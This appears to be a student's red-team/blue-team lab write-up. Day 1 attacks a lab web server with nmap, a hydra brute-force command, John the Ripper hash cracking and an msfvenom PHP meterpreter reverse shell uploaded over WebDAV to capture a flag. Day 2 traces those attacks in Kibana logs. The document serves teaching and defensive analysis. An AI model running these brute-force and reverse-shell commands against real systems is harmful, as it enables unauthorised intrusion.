### Presentation

* [Presentation Project 2 - Red vs Blue](https://docs.google.com/presentation/d/1o5kP7RrTumLeOpAKAgcN4QbE0NhggUn0IqP9X8dSDVE/edit?usp=sharing)
* [Presentation Project 2 - Red vs Blue - PDF](/Project_2-Red-vs-Blue/documentation/Project%202%20-%20Red%20vs%20Blue.pdf)

### Day 1 Deliverables

Complete the following to find the flag:

- Discover the IP address of the Linux web server.
> Run ```nmap 192.168.1.0/24```

![1-network-discovery](screenshots/1-network_discovery.png)

- Locate the hidden directory on the web server.
> Navigate to http://192.168.1.105:80, explored the server contents with a browser.

![2-website](screenshots/2-website.png)
![3-secret-folder](screenshots/3-secret-folder.png)

- Brute force the password for the hidden directory using the hydra command:
> Find the wordlist and unzip the package.

![4-rockyou-find](screenshots/4-rockyou-find.png)
![5-unzip-rockyou](screenshots/5-unzip-rockyou.png)

> Ran Hydra with the following command ```hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder```, logged into the website.

![6-hydra-bruteforce](screenshots/6-hydra-bruteforce.png)
![7-secret-folder-contents](screenshots/7-secret-folder-contents.png)

- Break the hashed password with the Crack Station website or John the Ripper.
> Read the contents of the secret folder and cracked the HASH password with John the Ripper. The cracked password is ```linux4u```.

![8-webdav-contents](screenshots/8-webdav-contents.png)
![9-john-the-ripper](screenshots/9-john-ripper.png)

- Connect to the server via WebDav.
> Connected to the WebDav service at ```192.168.1.105/webdav```.

![10-webdav_passwd](screenshots/10-webdav_passwd.png)

- Upload a PHP reverse shell payload.
> Created the payload with ```msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > meterpreter.php``` followed by uploading it with ```cadaver http://192.168.1.105/webdav``` and ```put meterpreter.php```.

![11-msfvenom](screenshots/11-msfvenom.png)
![12-cadaver](screenshots/12-cadaver.png)
![13-metasploit](screenshots/13-metasploit.png)

- Execute payload that you uploaded to the site to open up a meterpreter session.
> Payload executed by going to http://192.168.1.105/webdav/meterpreter.php.

![14-payload](screenshots/14-payload.png)

- Find and capture the flag.
> Ran ```locate flag```, followed by ```head /flag.txt```

![15-locate_flag](screenshots/15-locate_flag.png)
![16-flag](screenshots/16-flag.png)

### Day 2 Deliverables

#### Identify the offensive traffic.

* What time did the port scan occur?

> Port scan from 192.168.1.90 started around 14:42 on May 9th, 2022.

* How many packets were sent, and from which IP?

> 166,131 packets were sent from 192.168.1.90

* What indicates that this was a port scan?

> SYN scans from 192.168.1.90 to multiple ports on 192.168.1.105 through ICMP Echo for host detection.

![port-scan](/Project_2-Red-vs-Blue/screenshots/kibana-portscan.png)
#### Find the request for the hidden directory.

* What time did the request occur? How many requests were made?

> The request occurred at 15:07 on May 9th, 2022. There were 16,297 requests were made.

![kibana-secretfolder](/Project_2-Red-vs-Blue/screenshots/kibana-secretfolder.png)

* Which files were requested? What did they contain?

> The file ```/connect_to_corp_server``` was accessed. It contains instructions how to access web dav server, including MD5 Hashed password.

![kibana-filelook](/Project_2-Red-vs-Blue/screenshots/kibana-filelook.png)
#### Identify the brute force attack.

* How many requests were made in the attack?

> There were 16,297 requests made during the attack.

![kibana-hydra](/Project_2-Red-vs-Blue/screenshots/kibana-hydra.png)

* How many requests had been made before the attacker discovered the password?

> 16,296 attempts were made, resulting in HTTP Response code 401. The 16,297th attempt, was successful with HTTP Response code 301.

![kibana-301](/Project_2-Red-vs-Blue/screenshots/kibana-hydra301.png)
#### Find the WebDav connection.

* How many requests were made to this directory?

> There were 18 requests made to ```/webdav``` directory.

![kibana-webdav](/Project_2-Red-vs-Blue/screenshots/kibana-webdav.png)

* Which files were requested?

> The file requested was called ```meterpreter.php```.

![kibana-file](/Project_2-Red-vs-Blue/screenshots/kibana-accessedfiles.png)

